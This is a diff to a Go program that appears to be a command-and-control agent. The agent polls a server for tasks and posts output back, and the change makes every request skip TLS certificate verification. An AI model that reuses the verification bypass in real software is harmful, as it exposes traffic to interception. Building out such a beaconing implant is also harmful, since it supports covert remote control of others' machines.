@@ -13,6 +13,7 @@ import (
 	"time"
 	"strings"
 	"crypto/sha256"
+	"crypto/tls"
 	"math/big"
 	"runtime"
 )
@@ -36,6 +37,14 @@ type OutputPayload struct {
 
 var AgentID string
 
+
+//skip ssl verify
+var httpClient = &http.Client{
+    Transport: &http.Transport{
+        TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+    },
+    Timeout: 10 * time.Second,
+}
 
 
 //---------
@@ -103,7 +112,7 @@ func sendOutput(agentID string, output string) {
 		return
 	}
 
-	resp, err := http.Post(outputURL, "application/json", bytes.NewBuffer(jsonData))
+	resp, err := httpClient.Post(outputURL, "application/json", bytes.NewBuffer(jsonData))
 	if err != nil {
 		fmt.Printf("[-] Error sending output: %v\n", err)
 		return
@@ -128,7 +137,7 @@ func main() {
 	for {
 		// poll to server ep
 		pollURL := fmt.Sprintf("%s/api/agent/poll?id=%s", ServerURL, AgentID)
-		resp, err := http.Get(pollURL)
+		resp, err := httpClient.Get(pollURL)
 		if err != nil {
 			fmt.Printf("[-] Error connecting to server: %v\n", err)
 			time.Sleep(PollDelay)
